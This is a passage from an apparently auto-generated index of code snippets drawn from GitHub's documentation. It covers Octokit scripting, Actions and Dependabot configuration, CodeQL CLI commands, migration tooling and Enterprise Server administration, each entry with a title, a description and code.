https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-ruby.md#_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\n- name: Run script\n  env:\n    TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n  run: |\n    ruby .github/actions-scripts/use-the-api.rb\n```\n\n----------------------------------------\n\nTITLE: Iterating Through Paginated Results with Octokit\nDESCRIPTION: This snippet demonstrates how to use `octokit.paginate.iterator()` to process paginated results one page at a time. It iterates through issues and stops when an issue with \"test\" in the title is reached. Only the title and author are stored before stopping.  This is the most memory efficient way to handle large paginated sets.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-ruby.md#_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\niterator = octokit.paginate.iterator(\"GET /repos/{owner}/{repo}/issues\", owner: \"github\", repo: \"docs\", per_page: 100)\nissue_data = []\nbreak_loop = false\niterator.each do |data|\n  break if break_loop\n  data.each do |issue|\n    if issue.title.include?(\"test\")\n      break_loop = true\n      break\n    else\n      issue_data << { title: issue.title, author: issue.user.login }\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Crediting Account Function in Node.js\nDESCRIPTION: The `creditAccount()` function prompts the user for a credit amount using `rl.question()`. It validates the input to ensure it's a positive number.  If valid, it updates `finalBalance` and displays the new balance; otherwise, it displays an error message.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/modernizing-legacy-code-with-github-copilot.md#_snippet_11\n\nLANGUAGE: javascript\nCODE:\n```\nfunction creditAccount() {\n    rl.question(\"Enter credit amount: \", (amount) => {\n        amount = parseFloat(amount);\n        if (!isNaN(amount) && amount > 0) {\n            finalBalance += amount;\n            console.log(`Amount credited. New balance: ${finalBalance.toFixed(2)}`);\n        } else {\n            console.log(\"Invalid amount. Please try again.\");\n        }\n        promptUser();\n    });\n}\n```\n\n----------------------------------------\n\nTITLE: Building Python Release Distributions (Python)\nDESCRIPTION: This snippet illustrates the steps required to build Python release distributions using the `build` package. The `pip install build` command installs the build package, and `python -m build` executes the build process. This assumes the project is structured according to Python packaging standards.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-python.md#_snippet_12\n\nLANGUAGE: Python\nCODE:\n```\npython -m pip install build\npython -m build\n```\n\n----------------------------------------\n\nTITLE: Initializing Octokit Client\nDESCRIPTION: This Ruby snippet initializes the Octokit client for interacting with the {% data variables.product.github %} API. It uses the user's login and OAuth token obtained during authentication to create a new `Octokit::Client` instance. It depends on the `Octokit` gem and the `github_user` object from the Sinatra authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/rendering-data-as-graphs.md#_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nif !authenticated?\n  authenticate!\nelse\n  octokit_client = Octokit::Client.new(:login => github_user.login, :oauth_token => github_user.token)\nend\n```\n\n----------------------------------------\n\nTITLE: Installing Dependencies\nDESCRIPTION: This workflow installs dependencies using `go get`. It checks out the code, sets up the specified Go version ('1.21.x'), and then uses `go get` to install project dependencies and specified modules.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-go.md#_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Setup Go\n        uses: {% data reusables.actions.action-setup-go %}\n        with:\n          go-version: '1.21.x'\n      - name: Install dependencies\n        run: |\n          go get .\n          go get example.com/octo-examplemodule\n          go get example.com/octo-examplemodule@v1.3.4\n```\n\n----------------------------------------\n\nTITLE: Analyzing CodeQL Databases with Model Packs\nDESCRIPTION: Analyzes a CodeQL database using the `codeql database analyze` command with specified model packs. The command requires a database path, output format, model pack specifiers, and the query pack. It outputs a SARIF file containing analysis results enriched by the model pack's dependency information.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/customizing-analysis-with-codeql-packs.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n$ codeql database analyze /codeql-dbs/my-company --format=sarif-latest \\\n  --model-packs my-repo/my-java-model-pack \\\n  --output=/temp/my-company.sarif codeql/java-queries\n```\n\n----------------------------------------\n\nTITLE: Viewing Codespace Details using GitHub CLI\nDESCRIPTION: This command displays detailed information about an existing codespace. After executing the command, the user is prompted to select a codespace. Information displayed includes the name, state, repository, Git status, dev container configuration file path, machine type, idle timeout, creation date, and retention period.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/using-github-codespaces-with-github-cli.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace view\n```\n\n----------------------------------------\n\nTITLE: Removing a File with git-filter-repo\nDESCRIPTION: This command uses `git-filter-repo` to remove a specific file from the repository's history.  The `--path` argument specifies the path to the file to be removed, and `--invert-paths` ensures that only the specified file is affected.  `--sensitive-data-removal` enables sensitive data removal mode.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngit-filter-repo --sensitive-data-removal --invert-paths --path PATH-TO-YOUR-FILE-WITH-SENSITIVE-DATA\n```\n\n----------------------------------------\n\nTITLE: Configuring GitHub Actions Importer\nDESCRIPTION: This command configures the GitHub Actions Importer CLI with credentials for GitLab and GitHub. It prompts the user for a GitHub personal access token, the base URL of the GitHub instance, a GitLab personal access token, and the base URL of the GitLab instance.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer configure\n```\n\n----------------------------------------\n\nTITLE: Configuring npm Registry with Token\nDESCRIPTION: This snippet configures access to an npm registry using a token. It sets `replaces-base` to `true`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/configuring-access-to-private-registries-for-dependabot.md#_snippet_12\n\nLANGUAGE: YAML\nCODE:\n```\nregistries:\n  npm-github:\n    type: npm-registry\n    url: https://npm.pkg.github.com\n    token: ${{secrets.MY_GITHUB_PERSONAL_TOKEN}}\n    replaces-base: true\n```\n\n----------------------------------------\n\nTITLE: Uninstall Git LFS using command line\nDESCRIPTION: This command uninstalls Git LFS from the repository. It should be run after removing the files from the Git history. Requires Git LFS to be installed and initialized.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-large-files/removing-files-from-git-large-file-storage.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit lfs uninstall\n```\n\n----------------------------------------\n\nTITLE: GitLab CI/CD: PostgreSQL Service Container Configuration\nDESCRIPTION: This YAML snippet configures a job in GitLab CI/CD that uses a PostgreSQL service container. It defines environment variables for database access, specifies the `node:20-bookworm-slim` image for the job, and uses `postgres` as a service. The script installs dependencies and runs a JavaScript client to interact with the PostgreSQL database.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-gitlab-cicd-to-github-actions.md#_snippet_14\n\nLANGUAGE: yaml\nCODE:\n```\ncontainer-job:\n  variables:\n    POSTGRES_PASSWORD: postgres\n    # The hostname used to communicate with the\n    # PostgreSQL service container\n    POSTGRES_HOST: postgres\n    # The default PostgreSQL port\n    POSTGRES_PORT: 5432\n  image: node:20-bookworm-slim\n  services:\n    - postgres\n  script:\n    # Performs a clean installation of all dependencies\n    # in the `package.json` file\n    - npm ci\n    # Runs a script that creates a PostgreSQL client,\n    # populates the client with data, and retrieves data\n    - node client.js\n  tags:\n    - docker\n```\n\n----------------------------------------\n\nTITLE: Running the Copilot Extension Debug CLI\nDESCRIPTION: This snippet shows how to start the Copilot Extension Debug CLI tool.  It uses the `gh debug-cli` command, optionally including flags such as `url`, `log-level`, and `token` to configure the debugging session.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/debugging-your-github-copilot-extension.md#_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\ngh debug-cli\n```\n\n----------------------------------------\n\nTITLE: SSH connection to repository cache\nDESCRIPTION: This command establishes an SSH connection to the repository cache's IP address as the `admin` user. The connection is made on port 122.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/caching-repositories/configuring-a-repository-cache.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nssh -p 122 admin@REPLICA-IP\n```\n\n----------------------------------------\n\nTITLE: Verifying A Records with dig in Shell\nDESCRIPTION: This command uses the `dig` utility to query DNS records and verify that the A records for an apex domain are correctly configured. It filters the output to show only the answer section, displaying the IP addresses the domain resolves to.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/configuring-a-custom-domain-for-your-github-pages-site/managing-a-custom-domain-for-your-github-pages-site.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n$ dig EXAMPLE.COM +noall +answer -t A\n> EXAMPLE.COM    3600    IN A     185.199.108.153\n> EXAMPLE.COM    3600    IN A     185.199.109.153\n> EXAMPLE.COM    3600    IN A     185.199.110.153\n> EXAMPLE.COM    3600    IN A     185.199.111.153\n```\n\n----------------------------------------\n\nTITLE: Setting environment variables in PowerShell\nDESCRIPTION: These commands set environment variables required for migrating from Bitbucket Server to GitHub Enterprise Cloud using the GitHub CLI extension in PowerShell. They define the GitHub personal access token, Bitbucket Server username, Bitbucket Server password, and optionally the SMB password. Replace TOKEN, USERNAME and PASSWORD with your actual values.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-from-bitbucket-server-to-github-enterprise-cloud/migrating-repositories-from-bitbucket-server-to-github-enterprise-cloud.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n$env:GH_PAT=\"TOKEN\"\n     $env:BBS_USERNAME=\"USERNAME\"\n     $env:BBS_PASSWORD=\"PASSWORD\"\n     # If your Bitbucket Server instance runs on Windows\n     $env:SMB_PASSWORD=\"PASSWORD\"\n```\n\n----------------------------------------\n\nTITLE: Complete CircleCI configuration example\nDESCRIPTION: This snippet presents a complete CircleCI configuration file for setting up a Ruby environment with PostgreSQL.  It includes steps for checking out code, restoring and caching dependencies, waiting for the database, setting up the environment and database, and running tests.  It defines multiple Ruby versions and a workflow to run jobs for each version.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-circleci-to-github-actions.md#_snippet_6\n\nLANGUAGE: YAML\nCODE:\n```\n---\nversion: 2.1\n\ncommands:\n  shared_steps:\n    steps:\n      - checkout\n\n      # Restore Cached Dependencies\n      - restore_cache:\n          name: Restore bundle cache\n          key: administrate-{{ checksum \"Gemfile.lock\" }}\n\n      # Bundle install dependencies\n      - run: bundle install --path vendor/bundle\n\n      # Cache Dependencies\n      - save_cache:\n          name: Store bundle cache\n          key: administrate-{{ checksum \"Gemfile.lock\" }}\n          paths:\n            - vendor/bundle\n\n      # Wait for DB\n      - run: dockerize -wait tcp://localhost:5432 -timeout 1m\n\n      # Setup the environment\n      - run: cp .sample.env .env\n\n      # Setup the database\n      - run: bundle exec rake db:setup\n\n      # Run the tests\n      - run: bundle exec rake\n\ndefault_job: &default_job\n  working_directory: ~/administrate\n  steps:\n    - shared_steps\n    # Run the tests against multiple versions of Rails\n    - run: bundle exec appraisal install\n    - run: bundle exec appraisal rake\n\njobs:\n  ruby-25:\n    <<: *default_job\n    docker:\n      - image: circleci/ruby:2.5.0-node-browsers\n        environment:\n          PGHOST: localhost\n          PGUSER: administrate\n          RAILS_ENV: test\n      - image: postgres:10.1-alpine\n        environment:\n          POSTGRES_USER: administrate\n          POSTGRES_DB: ruby25\n          POSTGRES_PASSWORD: \"\"\n\n  ruby-26:\n    <<: *default_job\n    docker:\n      - image: circleci/ruby:2.6.3-node-browsers-legacy\n        environment:\n          PGHOST: localhost\n          PGUSER: administrate\n          RAILS_ENV: test\n      - image: postgres:10.1-alpine\n        environment:\n          POSTGRES_USER: administrate\n          POSTGRES_DB: ruby26\n          POSTGRES_PASSWORD: \"\"\n\nworkflows:\n  version: 2\n  multiple-rubies:\n    jobs:\n      - ruby-26\n      - ruby-25\n```\n\n----------------------------------------\n\nTITLE: Searching Audit Log by User\nDESCRIPTION: This snippet demonstrates how to use the `actor` qualifier to filter audit log events based on the user who performed the action. It includes examples of finding events for a specific user, multiple users, and excluding events performed by a particular user.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-accounts-and-repositories/managing-users-in-your-enterprise/auditing-users-across-your-enterprise.md#_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nactor:octocat\n```\n\nLANGUAGE: text\nCODE:\n```\nactor:octocat actor:hubot\n```\n\nLANGUAGE: text\nCODE:\n```\n-actor:hubot\n```\n\n----------------------------------------\n\nTITLE: Generating Artifact Attestation for Container Images with GitHub Actions\nDESCRIPTION: This snippet demonstrates how to generate an artifact attestation for a container image using the `actions/attest-build-provenance` action.  The `subject-name` specifies the fully-qualified image name (without a tag), and `subject-digest` provides the SHA256 digest of the image. The `push-to-registry` parameter determines whether the attestation should be pushed to a registry.  The registry and image name are obtained from environment variables.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds.md#_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\n- name: Generate artifact attestation\n  uses: actions/attest-build-provenance@v2\n  with:\n    subject-name: {% raw %}${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}{% endraw %}\n    subject-digest: 'sha256:fedcba0...'\n    push-to-registry: true\n```\n\n----------------------------------------\n\nTITLE: Counting Languages in Repositories\nDESCRIPTION: This Ruby snippet iterates through a list of repositories and counts the occurrence of each programming language. It creates a hash (`language_obj`) to store the language counts. If a repository has a language associated with it, the count for that language is incremented in the hash.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/rendering-data-as-graphs.md#_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nlanguage_obj = {}\nrepos.each do |repo|\n  # sometimes language can be nil\n  if repo.language\n    if !language_obj[repo.language]\n      language_obj[repo.language] = 1\n    else\n      language_obj[repo.language] += 1\n    end\n  end\nend\n\nlanguages.to_s\n```\n\n----------------------------------------\n\nTITLE: Setting replace-registry-host in npm\nDESCRIPTION: This snippet disables the replacement of the registry host in the lockfile using the `npm config set replace-registry-host` command. This ensures that the private registry URL is used.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_13\n\nLANGUAGE: shell\nCODE:\n```\nnpm config set replace-registry-host \"never\"\n```\n\n----------------------------------------\n\nTITLE: Add upstream repository using Git\nDESCRIPTION: This command adds a new remote repository named `upstream` to track the original repository.  Replace `ORIGINAL-OWNER` with the original owner's username and `Spoon-Knife` with the original repository name.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/working-with-forks/fork-a-repo.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\ngit remote add upstream https://{% data variables.product.product_url %}/ORIGINAL-OWNER/Spoon-Knife.git\n```\n\n----------------------------------------\n\nTITLE: Fork repository with remote using GitHub CLI\nDESCRIPTION: This command forks a repository and configures a remote connection to the upstream repository using the GitHub CLI. It requires the GitHub CLI to be installed and configured.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/working-with-forks/fork-a-repo.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngh repo fork REPOSITORY --remote=true\n```\n\n----------------------------------------\n\nTITLE: Migrating a Single Repository (GHES 3.7- with Azure)\nDESCRIPTION: This snippet shows how to migrate a single repository using the `gh gei migrate-repo` command for GitHub Enterprise Server 3.7 or earlier using Azure Blob Storage. It includes the `--azure-storage-connection-string` flag for authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-repositories-from-github-enterprise-server-to-github-enterprise-cloud.md#_snippet_11\n\nLANGUAGE: Shell\nCODE:\n```\ngh gei migrate-repo --github-source-org SOURCE --source-repo CURRENT-NAME --github-target-org DESTINATION --target-repo NEW-NAME \\\n    --ghes-api-url GHES-API-URL --azure-storage-connection-string \"AZURE_STORAGE_CONNECTION_STRING\"\n```\n\n----------------------------------------\n\nTITLE: Configuring NuGet registry with username/password in dependabot.yml\nDESCRIPTION: This snippet configures a NuGet registry in `dependabot.yml` using a username and password.  The registry type, URL, username, and password (stored as a secret) are specified.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_14\n\nLANGUAGE: yaml\nCODE:\n```\nregistries:\n  nuget-example:\n    type: nuget-feed\n    url: https://nuget.example.com/v3/index.json\n    username: octocat@example.com\n    password: ${{secrets.MY_NUGET_PASSWORD}}\n```\n\n----------------------------------------\n\nTITLE: Configuring Gemfile with Bundler (older versions) to use GitHub Packages Registry (Ruby)\nDESCRIPTION: This code snippet is for older versions of Bundler (prior to 1.7.0). It shows how to configure a Gemfile with a global source for the GitHub Packages registry and rubygems.org. Replace `NAMESPACE` with the GitHub user or organization. The `REGISTRY_URL` needs to be configured for GHES environments.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-rubygems-registry.md#_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nsource \"https://{% ifversion fpt or ghec %}rubygems.pkg.github.com{% else %}REGISTRY_URL{% endif %}/NAMESPACE\"\nsource \"https://rubygems.org\"\n\ngem \"rails\"\ngem \"GEM_NAME\"\n```\n\n----------------------------------------\n\nTITLE: Auditing Failed Imports with ghe-migrator\nDESCRIPTION: This command audits failed import records using `ghe-migrator audit`. It filters by various failure states (failed_import, failed_map, failed_rename, failed_merge) to identify problematic records requiring attention.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/migrating-data-to-github-enterprise-server.md#_snippet_10\n\nLANGUAGE: shell\nCODE:\n```\n$ ghe-migrator audit -s failed_import,failed_map,failed_rename,failed_merge -g MIGRATION-GUID\n```\n\n----------------------------------------\n\nTITLE: Setting visibility for multiple ports using GitHub CLI\nDESCRIPTION: This command sets the visibility for multiple forwarded ports in a single command using the GitHub CLI. Each port and its visibility setting are specified as `port:visibility` pairs.  Available visibility settings are `private`, `org`, and `public`.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/forwarding-ports-in-your-codespace.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace ports visibility 80:private 3000:public 3306:org\n```\n\n----------------------------------------\n\nTITLE: Installing CodeQL Pack Dependencies - Shell\nDESCRIPTION: This command installs all dependencies listed in the `qlpack.yml` file. It downloads the dependencies to the shared cache on the local disk. Running this command generates or updates the `codeql-pack.lock.yml` file.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-and-working-with-codeql-packs.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql pack install\n```\n\n----------------------------------------\n\nTITLE: Fetching a Pull Request for Modification\nDESCRIPTION: This snippet shows how to fetch a pull request based on its ID number and create a new local branch. It requires knowing the ID of the pull request and choosing a new branch name.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/reviewing-changes-in-pull-requests/checking-out-pull-requests-locally.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngit fetch origin pull/ID/head:BRANCH_NAME\n```\n\n----------------------------------------\n\nTITLE: Analyzing Database with Multiple CodeQL Packs (Shell)\nDESCRIPTION: This command analyzes a CodeQL database using multiple specified CodeQL packs.  It requires the database path, followed by a space separated list of scope/pack identifiers. The command executes the default query suite of each pack.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql <database> analyze <scope>/<pack> <scope>/<other-pack>\n```\n\n----------------------------------------\n\nTITLE: Building Production Docker Image\nDESCRIPTION: This command builds the production Docker image locally, tagging it as `docs:latest`. It uses a GitHub Personal Access Token (PAT) passed as a secret to access private repositories during the build process. The PAT needs read access to specific internal documentation and early access repositories.\nSOURCE: https://github.com/github/docs/blob/main/src/deployments/production/README.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ndocker build -t docs:latest . --secret id=DOCS_BOT_PAT_READPUBLICKEY,src=<(echo \"<your GH PAT value>\")\n```\n\n----------------------------------------\n\nTITLE: Retrieving databaseId using curl with GraphQL\nDESCRIPTION: This curl command executes a GraphQL query to fetch the `databaseId` of an enterprise.  It requires a `BEARER_TOKEN` for authentication and the `ENTERPRISE_SLUG`.  It sends a POST request to the GitHub GraphQL API endpoint.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-private-networking-for-hosted-compute-products/configuring-private-networking-for-github-hosted-runners-in-your-enterprise.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ncurl -H \"Authorization: Bearer BEARER_TOKEN\" -X POST \\\n  -d '{ \"query\": \"query($slug: String!) { enterprise (slug: $slug) { slug databaseId } }\" ,\n        \"variables\": {\n          \"slug\": \"ENTERPRISE_SLUG\"\n        }\n      }' \\\nhttps://api.github.com/graphql\n```\n\n----------------------------------------\n\nTITLE: Setting Up Network with ghe-setup-network (Shell)\nDESCRIPTION: The `ghe-setup-network` utility configures the primary network interface. The `-v` flag enables visual mode, providing a guided configuration experience. Use the `-h` flag for additional options.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_21\n\nLANGUAGE: shell\nCODE:\n```\nghe-setup-network -v\n```\n\n----------------------------------------\n\nTITLE: Resolve CodeQL Languages Command\nDESCRIPTION: The `codeql resolve languages` command lists installed CodeQL extractor packs. It can report multiple locations for each extractor pack name in JSON output if there are conflicting locations within a single search element.  The command supports options to specify search paths and output formats.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/resolve-languages.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql resolve languages <options>...\n```\n\n----------------------------------------\n\nTITLE: Configuring IAM role trust policy with sub claim (JSON)\nDESCRIPTION: This JSON snippet demonstrates how to configure the trust policy for an IAM role in AWS to use the `sub` claim in the OIDC token for validation. The `sub` claim is used to restrict which GitHub Actions workflows are able to assume the role, based on the repository and branch.  It also includes the `aud` claim to ensure the audience is sts.amazonaws.com. The condition ensures that only workflows from the specified repository and branch can assume the role.  Replace octo-org/octo-repo and refs/heads/octo-branch with the correct values.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n\"Condition\": {\n  \"StringEquals\": {\n    \"{`HOSTNAME/_services/token`}:aud\": \"sts.amazonaws.com\",\n    \"{`HOSTNAME/_services/token`}:sub\": \"repo:octo-org/octo-repo:ref:refs/heads/octo-branch\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Tool Tag: VS Code\nDESCRIPTION: This code snippet demonstrates how to use the `vscode` tag to display content relevant to VS Code users. It wraps instructions specific to VS Code.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_19\n\nLANGUAGE: text\nCODE:\n```\n{% raw %}{% vscode %}\n\nThese instructions are pertinent to VS Code users.\n\n{% endvscode %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Dry Run Rebalancing with ghe-cluster-balance rebalance\nDESCRIPTION: This snippet demonstrates how to perform a dry run of rebalancing allocations using the `ghe-cluster-balance rebalance` utility with the `--dry-run` flag and the `-j` flag to specify jobs. It allows you to preview the result of rebalancing without actually making any changes.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/rebalancing-cluster-workloads.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nghe-cluster-balance rebalance --dry-run -j JOB\n```\n\n----------------------------------------\n\nTITLE: Authenticating as Root Site Administrator with curl\nDESCRIPTION: This snippet demonstrates how to authenticate requests to the Manage GitHub Enterprise Server API using the root site administrator's password. It uses `curl` to send the API key and password with standard HTTP authentication to the specified hostname and administration port. Replace `ROOT-SITE-ADMINISTRATOR-PASSWORD` and `ADMINISTRATION-PORT` with appropriate values.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/enterprise-admin/manage-ghes.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncurl -L -u \"api_key:ROOT-SITE-ADMINISTRATOR-PASSWORD\" 'http(s)://HOSTNAME:ADMINISTRATION-PORT/manage'\n```\n\n----------------------------------------\n\nTITLE: Setting Extractor Options with -O/--extractor-option\nDESCRIPTION: This command-line option allows setting options for CodeQL extractors. The `extractor-option-name` should be of the form `extractor_name.group1.group2.option_name` or `group1.group2.option_name`. The `value` can be any string that does not contain a newline. Multiple values for array options will use all the values provided, in order, while string options will use the last value provided.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/database-create.md#_snippet_1\n\nLANGUAGE: Text\nCODE:\n```\n-O, --extractor-option=<extractor-option-name=value>\n```\n\n----------------------------------------\n\nTITLE: Restoring Firewall Rules UFW\nDESCRIPTION: This snippet provides commands to restore backed-up UFW firewall rules.  It first copies the backed-up rule files from `~/ufw.backup/*rules` to `/etc/ufw` using `sudo cp -f`. Then, it restarts the UFW service using `sudo systemctl restart ufw` to apply the restored rules. Finally, it checks the firewall status using `sudo ufw status` to confirm the restoration.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-network-settings/configuring-built-in-firewall-rules.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nsudo cp -f ~/ufw.backup/*rules /etc/ufw\n```\n\nLANGUAGE: shell\nCODE:\n```\nsudo systemctl restart ufw\n```\n\nLANGUAGE: shell\nCODE:\n```\nsudo ufw status\n```\n\n----------------------------------------\n\nTITLE: Granting Migrator Role using GitHub CLI\nDESCRIPTION: This snippet demonstrates how to use the `gh gei grant-migrator-role` command to grant the migrator role to a user or team within a specified GitHub organization.  The command requires specifying the organization, actor (user or team), and actor type (USER or TEAM).  It requires the GitHub CLI with the gei extension installed.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/managing-access-for-a-migration-between-github-products.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh gei grant-migrator-role --github-org ORGANIZATION --actor ACTOR --actor-type TYPE\n```\n\n----------------------------------------\n\nTITLE: GraphQL Query to Determine Object Type\nDESCRIPTION: This GraphQL query retrieves the `__typename` of a node given its `id`. It's used to determine the specific GraphQL object type (e.g., User, Repository, Issue) that corresponds to a `node_id` obtained from the REST API.  The `node_id` is passed as a parameter to the `node` query.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-global-node-ids.md#_snippet_2\n\nLANGUAGE: graphql\nCODE:\n```\nquery {\n  node(id:\"MDQ6VXNlcjU4MzIzMQ==\") {\n     __typename\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Deactivating Copilot for All Languages in github-copilot.xml\nDESCRIPTION: This snippet shows how to deactivate GitHub Copilot for all languages by setting the wildcard entry key '*' to 'false' within the `languageAllowList` of the `github-copilot.xml` file.  This configuration overrides any individual language settings unless explicitly overridden. A restart of the IDE is required for the changes to take effect.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configure-personal-settings/configuring-github-copilot-in-your-environment.md#_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<entry key=\"*\" value=\"false\" />\n```\n\n----------------------------------------\n\nTITLE: Generating SHA-256 Hash (PowerShell)\nDESCRIPTION: This PowerShell script computes the SHA-256 hash of a given string. It takes a string as input (`$ClearString`) and returns the hexadecimal representation of the hash. The script uses the .NET cryptography libraries.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/audit_log/generating-hash-for-a-token.md#_snippet_1\n\nLANGUAGE: powershell\nCODE:\n```\nParam (\n    [Parameter(Mandatory=$true)]\n    [string]\n    $ClearString\n)\n\n$hasher = [System.Security.Cryptography.HashAlgorithm]::Create('sha256')\n$hash = $hasher.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($ClearString))\n\n$hashString = [System.BitConverter]::ToString($hash)\n$hashString.Replace('-', '')\n```\n\n----------------------------------------\n\nTITLE: Example JSON response from Copilot Metrics API\nDESCRIPTION: This JSON snippet represents a sample response from the GitHub Copilot metrics API, showing daily metrics for active and engaged users, broken down by IDE, chat usage, and pull request activity.  It showcases the data structure returned by the API, including date and various usage metrics.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/rolling-out-github-copilot-at-scale/analyzing-usage-over-time-with-the-copilot-metrics-api.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n[\n  {\n    date: '2024-11-07',\n    copilot_ide_chat: { editors: [Array], total_engaged_users: 14 },\n    total_active_users: 28,\n    copilot_dotcom_chat: { models: [Array], total_engaged_users: 4 },\n    total_engaged_users: 28,\n    copilot_dotcom_pull_requests: { total_engaged_users: 0 },\n    copilot_ide_code_completions: { editors: [Array], total_engaged_users: 22 }\n  },\n...\n```\n\n----------------------------------------\n\nTITLE: Referencing a Named Branch in GitHub 